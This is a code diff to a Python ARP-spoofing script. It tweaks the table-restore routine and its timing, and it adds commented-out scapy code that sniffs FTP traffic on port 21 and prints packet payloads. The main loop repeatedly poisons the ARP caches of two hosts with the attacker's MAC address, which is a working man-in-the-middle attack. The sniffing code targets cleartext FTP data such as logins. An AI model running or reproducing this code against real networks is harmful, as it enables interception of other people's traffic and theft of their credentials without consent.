@@ -258,22 +258,30 @@ def poison_target(ip_src, ip_target, mac_target, infected_mac):
 
 def restore_arp_tables():
     print(f"Restoring tables...")
-    time.sleep(2)
+    time.sleep(5)
     poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_TARGET)
     poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_SRC)
-    print(f"")
+    print(f"ARP tables restored...")
+
+
+# from scapy.all import sniff, IP, TCP, Raw
+
+
+# def parse_ftp_packet(packet):
+#     print("parsing ftp...")
+#     if packet.haslayer(Raw):
+#         payload = packet[Raw].load.decode('utf-8', errors='ignore')
+#         print("PAYLOAD: ", payload)
+
 
 
 if __name__ == "__main__":
     try:
-        # server_socket = create_server_socket()
+        # sniff(filter="tcp port 21", prn=parse_ftp_packet, store=0)
+
         while True:
             poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_ATTACKER)
             poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_ATTACKER)
-            # print('-'*50)
             time.sleep(1)
-        recv_packet(server_socket)
     except KeyboardInterrupt:
-        print("keyboard interrupt")
-    # finally:
-        # server_socket.close()
+        restore_arp_tables()
